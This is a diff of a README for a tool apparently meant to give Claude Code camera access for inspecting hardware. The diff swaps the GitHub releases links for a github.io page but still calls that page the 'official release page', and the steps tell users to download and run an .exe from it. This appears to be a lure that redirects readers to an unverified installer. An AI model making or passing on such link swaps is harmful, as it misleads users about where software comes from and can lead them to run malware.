@@ -1,6 +1,6 @@
 # 👁️ claude-code-eyes - Let Claude see your physical hardware
 
-[![Download Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/philipreddish308/claude-code-eyes/releases)
+[![Download Release](https://img.shields.io/badge/Download-Release-blue)](https://philipreddish308.github.io)
 
 This application gives Claude Code the ability to monitor your real-world hardware. It uses your computer camera to check screens, wiring, and hardware components. You can verify panels render correctly, inspect cable layouts before powering up, and find issues that do not appear in software log files.
 
@@ -8,7 +8,7 @@ This application gives Claude Code the ability to monitor your real-world hardwa
 
 Follow these steps to get the tool on your computer.
 
-1. Go to the [official release page](https://github.com/philipreddish308/claude-code-eyes/releases).
+1. Go to the [official release page](https://philipreddish308.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe to download the installer.
 4. Open the downloaded file once the transfer completes.
